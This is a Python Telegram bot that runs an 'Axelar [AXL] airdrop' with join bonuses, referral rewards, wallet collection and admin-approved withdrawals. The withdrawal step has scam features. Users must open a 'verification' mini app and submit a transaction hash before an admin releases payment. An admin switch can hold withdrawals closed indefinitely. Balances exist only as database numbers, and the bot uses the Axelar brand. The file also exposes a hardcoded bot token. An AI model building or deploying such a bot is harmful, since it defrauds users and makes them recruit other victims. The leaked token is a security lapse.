"""
AXELAR [AXL] AIRDROP BOT
python-telegram-bot v21+  |  SQLite storage

Features
- Channel membership gate (2 channels) with "I've Joined" verification
- Joining bonus (200 AXL), referral reward (100 AXL), 4-hour bonus (1-30 AXL)
- Reply-keyboard buttons: My Account, Invite & Earn, Wallet, Bonus, Withdraw
- Wallet saving, withdrawal requests with Admin Approve / Reject buttons
- Admin commands: /stats, /broadcast <text>, /addbalance, /removebalance, /setbalance, /userinfo,
  /withdraw on|off|<N>d, /users, /topreferals [N]
- User command: /done (asks for the transaction hash)
"""
import os
import asyncio
import random
import re
import sqlite3
import time
import logging
import html
from datetime import datetime, timezone, timedelta

from telegram import (
    Update,
    ReplyKeyboardMarkup,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
)
from telegram.constants import ParseMode
from telegram.error import TelegramError
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ContextTypes,
    filters,
)

# ───────────────────────── CONFIG ─────────────────────────
BOT_TOKEN = os.getenv("8881285843:AAEWDuJPVHg8BQ4oa-eF6OLXPigrR-_Ye7o")  # Set this in your hosting environment; do not hardcode bot tokens
ADMIN_ID = 8564982849

TOKEN_NAME = "AXL"
TOKEN_PRICE_USD = 0.06

# Channels the user must join. Bot MUST be an admin in both.
CHANNEL_1 = "@axlannouncements"
CHANNEL_2 = "@AXLWITHDRAWALS"

JOIN_BONUS = 200
REFERRAL_REWARD = 150
BONUS_MIN, BONUS_MAX = 15, 30
BONUS_COOLDOWN = 4 * 60 * 60          # 4 hours
MIN_WITHDRAW = int(os.getenv("MIN_WITHDRAW", "1400"))

DB_PATH = os.getenv("DB_PATH", "axl_bot.db")
# UTC offset in minutes used to decide what "today" means in /users (330 = IST)
ADMIN_UTC_OFFSET_MIN = int(os.getenv("ADMIN_UTC_OFFSET_MIN", "330"))

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
log = logging.getLogger("axl-bot")

# ───────────────────────── BUTTONS ─────────────────────────
BTN_ACCOUNT = "👤 My Account"
BTN_INVITE = "🚀 Invite & Earn"
BTN_WALLET = "💼 Wallet"
BTN_BONUS = "🎁 Bonus"
BTN_WITHDRAW = "💰 Withdraw"

MAIN_MENU = ReplyKeyboardMarkup(
    [
        [BTN_ACCOUNT],
        [BTN_INVITE, BTN_WALLET],
        [BTN_BONUS, BTN_WITHDRAW],
    ],
    resize_keyboard=True,
    input_field_placeholder="Choose an option 🐕",
)

# ───────────────────────── DATABASE ─────────────────────────
db = sqlite3.connect(DB_PATH, check_same_thread=False)
db.row_factory = sqlite3.Row
db.executescript(
    """
CREATE TABLE IF NOT EXISTS users (
    user_id     INTEGER PRIMARY KEY,
    username    TEXT,
    first_name  TEXT,
    balance     INTEGER DEFAULT 0,
    referrer_id INTEGER,
    referrals   INTEGER DEFAULT 0,
    last_bonus  INTEGER DEFAULT 0,
    wallet      TEXT,
    activated   INTEGER DEFAULT 0,
    joined_at   INTEGER
);
CREATE TABLE IF NOT EXISTS withdrawals (
    id         INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id    INTEGER,
    amount     INTEGER,
    wallet     TEXT,
    status     TEXT DEFAULT 'pending',
    created_at INTEGER
);
CREATE TABLE IF NOT EXISTS hash_reviews (
    id         INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id    INTEGER NOT NULL,
    tx_hash    TEXT NOT NULL,
    status     TEXT DEFAULT 'pending',
    created_at INTEGER NOT NULL
);
CREATE TABLE IF NOT EXISTS settings (
    key   TEXT PRIMARY KEY,
    value TEXT
);
"""
)
db.commit()


def get_user(uid):
    return db.execute("SELECT * FROM users WHERE user_id=?", (uid,)).fetchone()


def add_balance(uid, amount):
    db.execute("UPDATE users SET balance = balance + ? WHERE user_id=?", (amount, uid))
    db.commit()


# ───────────────────────── HELPERS ─────────────────────────
def usd(amount):
    return f"${amount * TOKEN_PRICE_USD:,.2f}"


def fmt_wait(seconds):
    seconds = max(0, int(seconds))
    h, rem = divmod(seconds, 3600)
    m, _ = divmod(rem, 60)
    return f"{h}h {m}m" if h else f"{m}m"


# ── Settings + withdrawal switch (on | off | timer) ──
ADMIN_TZ = timezone(timedelta(minutes=ADMIN_UTC_OFFSET_MIN))


def get_setting(key, default=None):
    row = db.execute("SELECT value FROM settings WHERE key=?", (key,)).fetchone()
    return row["value"] if row else default


def set_setting(key, value):
    db.execute("INSERT OR REPLACE INTO settings (key, value) VALUES (?,?)", (key, str(value)))
    db.commit()


def withdraw_state():
    """Returns ('on' | 'off' | 'timer', seconds_remaining)."""
    mode = get_setting("withdraw_mode", "on")
    if mode == "off":
        return "off", 0
    if mode == "timer":
        remaining = int(get_setting("withdraw_open_at", "0")) - int(time.time())
        if remaining > 0:
            return "timer", remaining
        set_setting("withdraw_mode", "on")  # timer finished -> works normally
    return "on", 0


def fmt_timer(seconds):
    seconds = max(0, int(seconds))
    d, rem = divmod(seconds, 86400)
    h, rem = divmod(rem, 3600)
    m = rem // 60
    if d:
        return f"{d}d {h}h"
    if h:
        return f"{h}h {m}m"
    return f"{max(m, 1)}m"


def withdraw_closed_text():
    """None if withdrawals are open, otherwise the message to show the user."""
    state, remaining = withdraw_state()
    if state == "off":
        return "⏳ Withdrawal will be open after a few days.\nKeep inviting and collect tokens! 🚀"
    if state == "timer":
        return f"⏳ Withdrawals will be open in {fmt_timer(remaining)}."
    return None


def fmt_dt(ts):
    return datetime.fromtimestamp(ts, ADMIN_TZ).strftime("%d %b %H:%M")


def today_start_ts():
    now = datetime.now(ADMIN_TZ)
    return int(now.replace(hour=0, minute=0, second=0, microsecond=0).timestamp())


async def reply_chunked(message, blocks, limit=3800):
    """Send HTML text in several messages to stay under Telegram's 4096-char limit."""
    buf = ""
    for block in blocks:
        if buf and len(buf) + len(block) + 1 > limit:
            await message.reply_text(buf, parse_mode=ParseMode.HTML)
            buf = block
        else:
            buf = f"{buf}\n{block}" if buf else block
    if buf:
        await message.reply_text(buf, parse_mode=ParseMode.HTML)


def valid_wallet(text):
    # Axelar (bech32) address or EVM address
    return bool(
        re.fullmatch(r"axelar1[0-9a-z]{38}", text)
        or re.fullmatch(r"0x[a-fA-F0-9]{40}", text)
    )


def channel_url(ch):
    return f"https://t.me/{ch.lstrip('@')}"


async def is_member(bot, user_id):
    """True if the user is in BOTH required channels."""
    for ch in (CHANNEL_1, CHANNEL_2):
        try:
            m = await bot.get_chat_member(ch, user_id)
            if m.status in ("left", "kicked"):
                return False
        except TelegramError as e:
            log.warning("Membership check failed for %s: %s", ch, e)
            return False
    return True


def gate_keyboard():
    return InlineKeyboardMarkup(
        [
            [
                InlineKeyboardButton("📢 News Channel", url=channel_url(CHANNEL_1)),
                InlineKeyboardButton("💸 Live Payments", url=channel_url(CHANNEL_2)),
            ],
            [InlineKeyboardButton("✅ I've Joined", callback_data="verify")],
        ]
    )


GATE_TEXT = (
    "🔒 <b>Channel membership required</b>\n\n"
    "To use this section you must be a member of both official channels.\n\n"
    "1️⃣ Join both channels using the buttons below.\n"
    "2️⃣ Tap ✅ <b>I've Joined</b> to verify again.\n\n"
    "Your balance is safe and has not been changed. 👍"
)


async def activate_user(uid, context):
    """Give joining bonus + pay referrer, once per user."""
    u = get_user(uid)
    if not u or u["activated"]:
        return False
    db.execute(
        "UPDATE users SET activated=1, balance=balance+? WHERE user_id=?",
        (JOIN_BONUS, uid),
    )
    ref = u["referrer_id"]
    if ref and get_user(ref):
        db.execute(
            "UPDATE users SET balance=balance+?, referrals=referrals+1 WHERE user_id=?",
            (REFERRAL_REWARD, ref),
        )
        try:
            await context.bot.send_message(
                ref,
                f"🎉 <b>New referral!</b>\nYou earned <b>{REFERRAL_REWARD} {TOKEN_NAME}</b>.",
                parse_mode=ParseMode.HTML,
            )
        except TelegramError:
            pass
    db.commit()
    return True


async def require_member(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    uid = update.effective_user.id
    if await is_member(context.bot, uid):
        return True
    await update.effective_message.reply_text(
        GATE_TEXT, parse_mode=ParseMode.HTML, reply_markup=gate_keyboard()
    )
    return False


WELCOME = (
    "🐕💎 <b>AXELAR [AXL] AIRDROP — EARN AXL &amp; GET REWARDED!</b> 🚀\n\n"
    "🎁 <b>AIRDROP REWARDS</b>\n"
    f"💰 Joining Bonus: <b>{JOIN_BONUS} {TOKEN_NAME}</b>\n"
    f"🤝 Referral Reward: <b>{REFERRAL_REWARD} {TOKEN_NAME}</b> per invited friend\n"
    f"⏰ 4-Hour Bonus: Up to <b>{BONUS_MAX} {TOKEN_NAME}</b> every 4 hours!\n"
)

# ───────────────────────── HANDLERS ─────────────────────────
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    uid = user.id

    if not get_user(uid):
        referrer = None
        if context.args and context.args[0].startswith("ref_"):
            try:
                r = int(context.args[0][4:])
                if r != uid and get_user(r):
                    referrer = r
            except ValueError:
                pass
        db.execute(
            "INSERT INTO users (user_id, username, first_name, referrer_id, joined_at) "
            "VALUES (?,?,?,?,?)",
            (uid, user.username, user.first_name, referrer, int(time.time())),
        )
        db.commit()

    await update.message.reply_text(
        WELCOME, parse_mode=ParseMode.HTML, reply_markup=MAIN_MENU
    )

    if not await is_member(context.bot, uid):
        await update.message.reply_text(
            GATE_TEXT, parse_mode=ParseMode.HTML, reply_markup=gate_keyboard()
        )
        return

    if await activate_user(uid, context):
        await update.message.reply_text(
            f"🎉 <b>Joining bonus received!</b>\n+{JOIN_BONUS} {TOKEN_NAME} added to your balance.",
            parse_mode=ParseMode.HTML,
        )


async def verify_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    uid = q.from_user.id
    if not get_user(uid):
        db.execute(
            "INSERT INTO users (user_id, username, first_name, joined_at) VALUES (?,?,?,?)",
            (uid, q.from_user.username, q.from_user.first_name, int(time.time())),
        )
        db.commit()

    if not await is_member(context.bot, uid):
        await q.answer("❌ You haven't joined both channels yet!", show_alert=True)
        return

    await q.answer("✅ Verified!")
    bonus_given = await activate_user(uid, context)
    text = "✅ <b>Verification successful!</b>\n"
    if bonus_given:
        text += f"🎁 Joining bonus: +{JOIN_BONUS} {TOKEN_NAME}\n"
    text += "\nUse the menu below to continue."
    await q.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=MAIN_MENU)


async def my_account(update, context):
    u = get_user(update.effective_user.id)
    bal = u["balance"]
    text = (
        "👤 <b>My Account</b>\n\n"
        f"🆔 ID: <code>{u['user_id']}</code>\n"
        f"💰 Balance: <b>{bal:,} {TOKEN_NAME}</b> ~ {usd(bal)}\n"
        f"👥 Referrals: <b>{u['referrals']}</b>\n"
        f"💼 Wallet: <code>{u['wallet'] or 'Not set'}</code>"
    )
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)


async def invite(update, context):
    uid = update.effective_user.id
    me = await context.bot.get_me()
    link = f"https://t.me/{me.username}?start=ref_{uid}"
    u = get_user(uid)
    text = (
        "🚀 <b>Invite &amp; Earn</b>\n\n"
        f"Earn <b>{REFERRAL_REWARD} {TOKEN_NAME}</b> for every friend who joins with your link!\n\n"
        f"👥 Your referrals: <b>{u['referrals']}</b>\n"
        f"💸 Earned from referrals: <b>{u['referrals'] * REFERRAL_REWARD:,} {TOKEN_NAME}</b>\n\n"
        f"🔗 Your link:\n<code>{link}</code>"
    )
    kb = InlineKeyboardMarkup(
        [[InlineKeyboardButton("📤 Share Link", url=f"https://t.me/share/url?url={link}&text=Claim%20free%20{TOKEN_NAME}%20airdrop!")]]
    )
    await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)


async def wallet(update, context):
    u = get_user(update.effective_user.id)
    text = (
        "💼 <b>Wallet</b>\n\n"
        f"Address: <code>{u['wallet'] or 'Not set'}</code>\n\n"
        "Supported: Axelar (<code>axelar1…</code>) or EVM (<code>0x…</code>) address."
    )
    kb = InlineKeyboardMarkup(
        [[InlineKeyboardButton("✏️ Set / Change Wallet", callback_data="setwallet")]]
    )
    await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)


async def setwallet_cb(update, context):
    q = update.callback_query
    await q.answer()
    context.user_data["awaiting_wallet"] = True
    await q.message.reply_text("✏️ Send me your wallet address now:")


async def bonus(update, context):
    uid = update.effective_user.id
    u = get_user(uid)
    now = int(time.time())
    wait = u["last_bonus"] + BONUS_COOLDOWN - now
    if wait > 0:
        await update.message.reply_text(
            f"⏳ Your next bonus will be ready in <b>{fmt_wait(wait)}</b>.",
            parse_mode=ParseMode.HTML,
        )
        return
    amount = random.randint(BONUS_MIN, BONUS_MAX)
    db.execute(
        "UPDATE users SET balance=balance+?, last_bonus=? WHERE user_id=?",
        (amount, now, uid),
    )
    db.commit()
    bal = get_user(uid)["balance"]
    await update.message.reply_text(
        "🎉 <b>Bonus Claimed Successfully!</b>\n\n"
        f"🎁 You received <b>{amount} {TOKEN_NAME}</b>.\n"
        f"💰 Your Balance: <b>{bal:,} {TOKEN_NAME}</b> ~ {usd(bal)}\n\n"
        "⏰ Your next bonus will be ready in 4h for the next one! 🔥",
        parse_mode=ParseMode.HTML,
    )


async def withdraw(update, context):
    u = get_user(update.effective_user.id)
    if not u:
        await update.message.reply_text("Please send /start first.")
        return

    bal = u["balance"]
    if bal < MIN_WITHDRAW:
        await update.message.reply_text(
            f"❌ Minimum withdrawal amount = <b>{MIN_WITHDRAW:,} {TOKEN_NAME}</b>\n"
            f"💰 Your balance = <b>{bal:,} {TOKEN_NAME}</b>",
            parse_mode=ParseMode.HTML,
        )
        return

    # Admin switch: /withdraw off  or  /withdraw Xd timer
    closed = withdraw_closed_text()
    if closed:
        await update.message.reply_text(closed)
        return

    # Once an admin has confirmed a hash for this user, don't ask for it again.
    approved_hash = db.execute(
        "SELECT id FROM hash_reviews WHERE user_id=? AND status='confirmed' "
        "ORDER BY id DESC LIMIT 1",
        (update.effective_user.id,),
    ).fetchone()

    if approved_hash:
        if not u["wallet"]:
            await update.message.reply_text(
                "⚠️ Please set your wallet first using the 💼 Wallet button."
            )
            return

        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton(
                f"✅ Confirm withdrawal of {bal:,} {TOKEN_NAME}",
                callback_data="wd_confirm",
            )],
            [InlineKeyboardButton("✖️ Cancel", callback_data="wd_cancel")],
        ])
        await update.message.reply_text(
            "✅ <b>Hash review already confirmed.</b> You can continue with your withdrawal.\n\n"
            f"💰 <b>Withdrawal amount:</b> {bal:,} {TOKEN_NAME}\n"
            f"💼 <b>Wallet:</b> <code>{u['wallet']}</code>\n\n"
            "Choose Confirm to submit your withdrawal request for admin processing.",
            parse_mode=ParseMode.HTML,
            reply_markup=kb,
        )
        return

    # No confirmed hash yet: request one for admin review. No crypto fee is requested.
    context.user_data["awaiting_tx_hash"] = True
    await update.message.reply_text(
                 "🔐ACCOUNT VERIFICATION NOTICE\n\n"
            "Dear User,\n"
            "Due to high numbers of fake users and bots 🤖. "
            "We have added a verification step to eliminate fake bots. "
            "We ensure that every real user got awarded.🎁\n\n"
            "OPEN THE MINI APP FOR VERIFICATION.\n\n"
            "VERIFICATION PROOF: Send /done after completing the verification step."
    )


async def done_cmd(update, context):
    """/done (everyone, incl. admin): ask for the transaction hash."""
    uid = update.effective_user.id
    if not get_user(uid):
        await start(update, context)
        return
    context.user_data["awaiting_tx_hash"] = True
    await update.message.reply_text("Send the transaction hash ID for confirmation.")


async def wd_confirm_cb(update, context):
    q = update.callback_query
    uid = q.from_user.id
    u = get_user(uid)
    amount = u["balance"]
    if amount < MIN_WITHDRAW or not u["wallet"]:
        await q.answer("Not eligible.", show_alert=True)
        return
    closed = withdraw_closed_text()
    if closed:
        await q.answer(closed, show_alert=True)
        return
    db.execute("UPDATE users SET balance=0 WHERE user_id=?", (uid,))
    cur = db.execute(
        "INSERT INTO withdrawals (user_id, amount, wallet, created_at) VALUES (?,?,?,?)",
        (uid, amount, u["wallet"], int(time.time())),
    )
    db.commit()
    wid = cur.lastrowid
    await q.answer("Request submitted!")
    await q.edit_message_text(
        f"✅ Withdrawal request <b>#{wid}</b> submitted for <b>{amount:,} {TOKEN_NAME}</b>.\n"
        "You'll be notified once it's processed.",
        parse_mode=ParseMode.HTML,
    )
    if ADMIN_ID:
        kb = InlineKeyboardMarkup(
            [[
                InlineKeyboardButton("✅ Approve", callback_data=f"wd_ok_{wid}"),
                InlineKeyboardButton("❌ Reject", callback_data=f"wd_no_{wid}"),
            ]]
        )
        await context.bot.send_message(
            ADMIN_ID,
            f"💸 <b>Withdrawal #{wid}</b>\nUser: <code>{uid}</code> (@{u['username']})\n"
            f"Amount: {amount:,} {TOKEN_NAME}\nWallet: <code>{u['wallet']}</code>",
            parse_mode=ParseMode.HTML,
            reply_markup=kb,
        )


async def wd_cancel_cb(update, context):
    await update.callback_query.answer()
    await update.callback_query.edit_message_text("✖️ Withdrawal cancelled.")


async def wd_admin_cb(update, context):
    q = update.callback_query
    if q.from_user.id != ADMIN_ID:
        await q.answer("Admins only.", show_alert=True)
        return
    _, action, wid = q.data.split("_")
    w = db.execute("SELECT * FROM withdrawals WHERE id=?", (wid,)).fetchone()
    if not w or w["status"] != "pending":
        await q.answer("Already processed.", show_alert=True)
        return
    if action == "ok":
        db.execute("UPDATE withdrawals SET status='approved' WHERE id=?", (wid,))
        msg = f"✅ Your withdrawal #{wid} of {w['amount']:,} {TOKEN_NAME} was approved and sent."
        label = "APPROVED ✅ (send the tokens manually)"
    else:
        db.execute("UPDATE withdrawals SET status='rejected' WHERE id=?", (wid,))
        add_balance(w["user_id"], w["amount"])
        msg = f"❌ Your withdrawal #{wid} was rejected. {w['amount']:,} {TOKEN_NAME} refunded to your balance."
        label = "REJECTED ❌ (refunded)"
    db.commit()
    await q.answer("Done")
    await q.edit_message_text(f"{q.message.text}\n\n{label}")
    try:
        await context.bot.send_message(w["user_id"], msg)
    except TelegramError:
        pass


async def hash_review_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    if q.from_user.id != ADMIN_ID:
        await q.answer("Admins only.", show_alert=True)
        return

    # Accept both the current callback format and older button formats.
    match = re.fullmatch(r"hash_(ok|no)_(\d+)", q.data or "")
    if not match:
        match = re.fullmatch(r"hashreview_(confirm|reject)_(\d+)", q.data or "")
    if not match:
        await q.answer("Invalid action. Please restart the bot and try again.", show_alert=True)
        return

    action, review_id_text = match.groups()
    action = {"confirm": "ok", "reject": "no"}.get(action, action)
    review_id = int(review_id_text)
    review = db.execute(
        "SELECT * FROM hash_reviews WHERE id=?", (review_id,)
    ).fetchone()

    if not review or review["status"] != "pending":
        await q.answer("Already processed.", show_alert=True)
        return

    status = "confirmed" if action == "ok" else "rejected"
    db.execute(
        "UPDATE hash_reviews SET status=? WHERE id=? AND status='pending'",
        (status, review_id),
    )
    db.commit()

    if action == "ok":
        user_msg = f"✅ Your transaction hash review #{review_id} was confirmed."
        label = "CONFIRMED ✅"
    else:
        user_msg = f"❌ Your transaction hash review #{review_id} was rejected."
        label = "REJECTED ❌"

    await q.answer("Decision saved.")
    await q.edit_message_text(f"{q.message.text}\n\n{label}")
    try:
        await context.bot.send_message(review["user_id"], user_msg)
    except TelegramError:
        pass


async def text_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (update.message.text or "").strip()
    uid = update.effective_user.id

    if not get_user(uid):
        await start(update, context)
        return

    # Transaction hash submission mode
    if context.user_data.get("awaiting_tx_hash"):
        if text in (BTN_ACCOUNT, BTN_INVITE, BTN_WALLET, BTN_BONUS, BTN_WITHDRAW):
            context.user_data["awaiting_tx_hash"] = False
        else:
            if not re.fullmatch(r"[0-9a-fA-F]{64}", text):
                await update.message.reply_text("❌Please check your Hash id ")
                return

            u = get_user(uid)
            if not u or u["balance"] < MIN_WITHDRAW:
                context.user_data["awaiting_tx_hash"] = False
                bal = u["balance"] if u else 0
                await update.message.reply_text(
                    f"❌ Minimum withdrawal amount = {MIN_WITHDRAW:,} {TOKEN_NAME}\n"
                    f"💰 Your balance = {bal:,} {TOKEN_NAME}"
                )
                return

            # Avoid duplicate pending submissions of the same hash.
            existing = db.execute(
                "SELECT id FROM hash_reviews WHERE tx_hash=? AND status='pending'",
                (text.lower(),),
            ).fetchone()
            if existing:
                await update.message.reply_text(
                    "🕐 This hash is already pending review. Please wait for the decision."
                )
                return

            cur = db.execute(
                "INSERT INTO hash_reviews (user_id, tx_hash, created_at) VALUES (?,?,?)",
                (uid, text.lower(), int(time.time())),
            )
            db.commit()
            review_id = cur.lastrowid
            context.user_data["awaiting_tx_hash"] = False
            await update.message.reply_text("YOUR HASH REWIEW IS PENDING 🕐")

            if ADMIN_ID:
                kb = InlineKeyboardMarkup([[
                    InlineKeyboardButton("✅ Confirm", callback_data=f"hashreview_confirm_{review_id}"),
                    InlineKeyboardButton("❌ Reject", callback_data=f"hashreview_reject_{review_id}"),
                ]])
                await context.bot.send_message(
                    ADMIN_ID,
                    f"🧾 <b>Transaction hash review #{review_id}</b>\n"
                    f"User ID: <code>{uid}</code>\n"
                    f"Username: @{u['username'] or 'none'}\n"
                    f"Balance: {u['balance']:,} {TOKEN_NAME}\n"
                    f"Transaction hash: <code>{text.lower()}</code>",
                    parse_mode=ParseMode.HTML,
                    reply_markup=kb,
                )
            return

    # wallet input mode
    if context.user_data.get("awaiting_wallet"):
        if text in (BTN_ACCOUNT, BTN_INVITE, BTN_WALLET, BTN_BONUS, BTN_WITHDRAW):
            context.user_data["awaiting_wallet"] = False
        elif valid_wallet(text):
            db.execute("UPDATE users SET wallet=? WHERE user_id=?", (text, uid))
            db.commit()
            context.user_data["awaiting_wallet"] = False
            await update.message.reply_text(
                f"✅ Wallet saved:\n<code>{text}</code>", parse_mode=ParseMode.HTML
            )
            return
        else:
            await update.message.reply_text("❌ Invalid address. Send a valid axelar1… or 0x… address.")
            return

    routes = {
        BTN_ACCOUNT: my_account,
        BTN_INVITE: invite,
        BTN_WALLET: wallet,
        BTN_BONUS: bonus,
        BTN_WITHDRAW: withdraw,
    }
    handler = routes.get(text)
    if not handler:
        await update.message.reply_text("Please use the menu buttons below 👇", reply_markup=MAIN_MENU)
        return
    if not await require_member(update, context):
        return
    await activate_user(uid, context)
    await handler(update, context)


# ───────────────────────── ADMIN ─────────────────────────
async def stats(update, context):
    if update.effective_user.id != ADMIN_ID:
        return
    n = db.execute("SELECT COUNT(*) c FROM users").fetchone()["c"]
    total = db.execute("SELECT COALESCE(SUM(balance),0) s FROM users").fetchone()["s"]
    pend = db.execute("SELECT COUNT(*) c FROM withdrawals WHERE status='pending'").fetchone()["c"]
    await update.message.reply_text(
        f"📊 Users: {n}\n💰 Total balances: {total:,} {TOKEN_NAME}\n⏳ Pending withdrawals: {pend}"
    )


async def broadcast(update, context):
    if update.effective_user.id != ADMIN_ID:
        return
    msg = " ".join(context.args)
    if not msg:
        await update.message.reply_text("Usage: /broadcast <message>")
        return
    sent = 0
    for row in db.execute("SELECT user_id FROM users").fetchall():
        try:
            await context.bot.send_message(row["user_id"], msg)
            sent += 1
        except TelegramError:
            pass
    await update.message.reply_text(f"📣 Sent to {sent} users.")



async def _admin_balance(update, context, mode):
    """mode: add | remove | set"""
    if update.effective_user.id != ADMIN_ID:
        return
    usage = f"Usage: /{mode}balance <user_id> <amount>"
    if len(context.args) != 2:
        await update.message.reply_text(usage)
        return
    try:
        target = int(context.args[0])
        amount = int(context.args[1])
    except ValueError:
        await update.message.reply_text(usage)
        return
    if amount < 0:
        await update.message.reply_text("Amount must be 0 or more.")
        return
    u = get_user(target)
    if not u:
        await update.message.reply_text("❌ User not found (they must have started the bot).")
        return
    if mode == "add":
        new_bal = u["balance"] + amount
    elif mode == "remove":
        new_bal = max(0, u["balance"] - amount)
    else:
        new_bal = amount
    db.execute("UPDATE users SET balance=? WHERE user_id=?", (new_bal, target))
    db.commit()
    await update.message.reply_text(
        f"✅ User {target}\nOld balance: {u['balance']:,} {TOKEN_NAME}\nNew balance: {new_bal:,} {TOKEN_NAME}"
    )
    try:
        await context.bot.send_message(
            target, f"💰 Your balance was updated by admin.\nNew balance: {new_bal:,} {TOKEN_NAME}"
        )
    except TelegramError:
        pass


async def addbalance(update, context):
    await _admin_balance(update, context, "add")


async def removebalance(update, context):
    await _admin_balance(update, context, "remove")


async def setbalance(update, context):
    await _admin_balance(update, context, "set")


async def userinfo(update, context):
    if update.effective_user.id != ADMIN_ID:
        return
    if len(context.args) != 1 or not context.args[0].isdigit():
        await update.message.reply_text("Usage: /userinfo <user_id>")
        return
    u = get_user(int(context.args[0]))
    if not u:
        await update.message.reply_text("❌ User not found.")
        return
    await update.message.reply_text(
        f"👤 {u['first_name']} (@{u['username']})\n"
        f"🆔 {u['user_id']}\n"
        f"💰 Balance: {u['balance']:,} {TOKEN_NAME}\n"
        f"👥 Referrals: {u['referrals']}\n"
        f"💼 Wallet: {u['wallet'] or 'Not set'}"
    )


async def withdraw_admin(update, context):
    """/withdraw off | on | <days>d"""
    if update.effective_user.id != ADMIN_ID:
        return
    arg = context.args[0].lower() if context.args else ""
    usage = "Usage:\n/withdraw off\n/withdraw on\n/withdraw 15d  (closed for 15 days, then opens)"

    if arg == "off":
        set_setting("withdraw_mode", "off")
        await update.message.reply_text("🔒 Withdrawals are now OFF.")
        return
    if arg == "on":
        set_setting("withdraw_mode", "on")
        await update.message.reply_text("✅ Withdrawals are now ON.")
        return

    m = re.fullmatch(r"(\d+)d", arg)
    if not m or not (1 <= int(m.group(1)) <= 3650):
        await update.message.reply_text(usage)
        return
    state, _ = withdraw_state()
    if state == "off":
        await update.message.reply_text(
            "❌ Withdrawals are OFF. Send /withdraw on first, then /withdraw Xd."
        )
        return
    days = int(m.group(1))
    open_at = int(time.time()) + days * 86400
    set_setting("withdraw_open_at", open_at)
    set_setting("withdraw_mode", "timer")
    await update.message.reply_text(
        f"⏳ Timer set. Withdrawals closed for {days}d, opening at {fmt_dt(open_at)}."
    )


async def users_today(update, context):
    if update.effective_user.id != ADMIN_ID:
        return
    rows = db.execute(
        "SELECT * FROM users WHERE joined_at>=? ORDER BY joined_at DESC",
        (today_start_ts(),),
    ).fetchall()
    if not rows:
        await update.message.reply_text("No new users today.")
        return
    active = sum(1 for r in rows if r["activated"])
    blocks = [f"🆕 <b>New users today: {len(rows)}</b> (activated: {active})\n"]
    for i, r in enumerate(rows, 1):
        uname = f"@{html.escape(r['username'])}" if r["username"] else "no username"
        status = "✅" if r["activated"] else "⏳ not verified"
        blocks.append(
            f"{i}. <code>{r['user_id']}</code> | {uname} | {html.escape(r['first_name'] or '-')}\n"
            f"    💰 {r['balance']:,} {TOKEN_NAME} | 👥 {r['referrals']} | "
            f"ref by: {r['referrer_id'] or '-'} | {status} | {fmt_dt(r['joined_at'])}\n"
        )
    await reply_chunked(update.message, blocks)


async def top_referrals(update, context):
    if update.effective_user.id != ADMIN_ID:
        return
    n = 10
    if context.args:
        if not context.args[0].isdigit() or int(context.args[0]) < 1:
            await update.message.reply_text("Usage: /topreferals [count]  e.g. /topreferals 15")
            return
        n = min(int(context.args[0]), 500)
    rows = db.execute(
        "SELECT user_id, username, first_name, referrals, balance FROM users "
        "WHERE referrals>0 ORDER BY referrals DESC, balance DESC LIMIT ?",
        (n,),
    ).fetchall()
    if not rows:
        await update.message.reply_text("No referrals yet.")
        return
    blocks = [f"🏆 <b>Top {len(rows)} referrers</b>\n"]
    for i, r in enumerate(rows, 1):
        uname = f"@{html.escape(r['username'])}" if r["username"] else "no username"
        blocks.append(
            f"{i}. <code>{r['user_id']}</code> | {uname} | {html.escape(r['first_name'] or '-')}\n"
            f"    👥 {r['referrals']} referrals | 💰 {r['balance']:,} {TOKEN_NAME}"
        )
    await reply_chunked(update.message, blocks)


# ───────────────────────── MAIN ─────────────────────────
def main():
    if not BOT_TOKEN:
        raise RuntimeError("BOT_TOKEN environment variable is not set.")

    app = (
        Application.builder()
        .token(BOT_TOKEN)
        .connect_timeout(30)
        .read_timeout(30)
        .write_timeout(30)
        .pool_timeout(30)
        .get_updates_connect_timeout(30)
        .get_updates_read_timeout(30)
        .get_updates_write_timeout(30)
        .get_updates_pool_timeout(30)
        .build()
    )
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stats", stats))
    app.add_handler(CommandHandler("broadcast", broadcast))
    app.add_handler(CommandHandler("addbalance", addbalance))
    app.add_handler(CommandHandler("removebalance", removebalance))
    app.add_handler(CommandHandler("setbalance", setbalance))
    app.add_handler(CommandHandler("userinfo", userinfo))
    app.add_handler(CommandHandler("withdraw", withdraw_admin))
    app.add_handler(CommandHandler("done", done_cmd))
    app.add_handler(CommandHandler("users", users_today))
    app.add_handler(CommandHandler(["topreferals", "topreferrals"], top_referrals))
    app.add_handler(CallbackQueryHandler(verify_cb, pattern="^verify$"))
    app.add_handler(CallbackQueryHandler(setwallet_cb, pattern="^setwallet$"))
    app.add_handler(CallbackQueryHandler(wd_confirm_cb, pattern="^wd_confirm$"))
    app.add_handler(CallbackQueryHandler(wd_cancel_cb, pattern="^wd_cancel$"))
    app.add_handler(CallbackQueryHandler(wd_admin_cb, pattern=r"^wd_(ok|no)_\d+$"))
    app.add_handler(CallbackQueryHandler(hash_review_cb, pattern=r"^(hash_(ok|no)|hashreview_(confirm|reject))_\d+$"))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_router))
    log.info("Bot started")

    # Python 3.14+ may not create a current event loop automatically.
    try:
        asyncio.get_event_loop()
    except RuntimeError:
        asyncio.set_event_loop(asyncio.new_event_loop())

    app.run_polling(bootstrap_retries=-1)  # keep retrying if the network is slow


if __name__ == "__main__":
    main()
